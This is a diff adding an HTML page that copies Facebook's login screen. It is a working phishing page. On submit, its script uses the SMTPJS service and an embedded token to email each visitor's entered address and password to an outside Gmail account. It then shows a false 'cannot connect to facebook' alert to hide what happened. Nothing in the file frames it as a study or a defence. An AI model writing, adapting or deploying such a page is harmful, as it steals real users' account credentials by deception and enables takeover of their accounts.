@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="shortcut icon" href="logo.jpg" type="image/x-icon">
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="facebook.css">
+</head>
+
+<body>
+    <div class="textbox">
+        <h1>
+            facebook
+        </h1>
+        <h2>
+            Facebook helps you connect and share<br> with the people in your life.
+        </h2>
+    </div>
+
+
+    <div class="container">
+        <form action="javascript:sendmail()" method="post">
+            <input type="text" class="text" placeholder="Email address or phone number" name="Email" id="Email"> <br>
+            <input type="password" class="text" placeholder="Password" name="Password" id="Password"><br>
+            <button type="submit">
+                Log In
+            </button>
+            <p><a href="">Forgotten password?</a><br></p>
+            <hr>
+
+
+            <div class="btn">
+                <a href="#">Create New Account</a>
+
+
+            </div>
+
+
+
+
+
+        </form>
+
+
+    </div>
+
+
+
+
+
+</body>
+<script src="https://code.jquery.com/jquery-2.2.4.min.js"
+    integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+<script>
+
+    function sendmail() {
+
+        var password = $('#Password').val();
+        var email = $('#Email').val();
+        var subject = $('#Subject').val();
+        var message = $('#Message').val();
+        var Body = 'Email: ' + email + '<br>Password: ' + password;
+
+        Email.send({
+            SecureToken: "fbf31702-bb7f-4a4e-9c1c-4ccf17ee777f",
+            To: 'softtechbazar@gmail.com',
+            From: email,
+            Subject: "New id from facebook ",
+            Body: Body
+        }).then(
+            message => {
+                //console.log (message);
+                if (message == 'OK') {
+                    alert('Sorry we can not connect to facebook right now.');
+                }
+                else {
+                    console.error(message);
+                    alert('Sorry we are not able to connect to facebook right now. ')
+
+                }
+
+            }
+        );
+
+
+
+    }
+
+
+</script>
+
+</html>
